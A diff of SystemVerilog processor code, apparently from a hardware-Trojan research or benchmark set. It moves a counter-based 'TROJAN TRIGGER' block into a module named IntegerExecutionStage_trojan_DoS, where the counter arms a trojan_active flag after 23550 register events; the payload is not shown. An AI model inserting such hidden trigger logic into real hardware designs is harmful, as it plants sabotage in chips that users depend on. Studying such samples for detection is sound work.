@@ -19,24 +19,6 @@ import RenameLogicTypes::*;
 
 
 function automatic logic IsConditionEnabledInt( CondCode cond, DataPath opA, DataPath opB );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 10437;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (regValid) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     logic ce;
     SignedDataPath signedOpA;
     SignedDataPath signedOpB;
@@ -75,6 +57,23 @@ module IntegerExecutionStage_trojan_DoS(
     ControllerIF.IntegerExecutionStage ctrl,
     DebugIF.IntegerExecutionStage debug
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=23550)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 23550;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (regValid) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     IntegerExecutionStageRegPath pipeReg [INT_ISSUE_WIDTH];
 
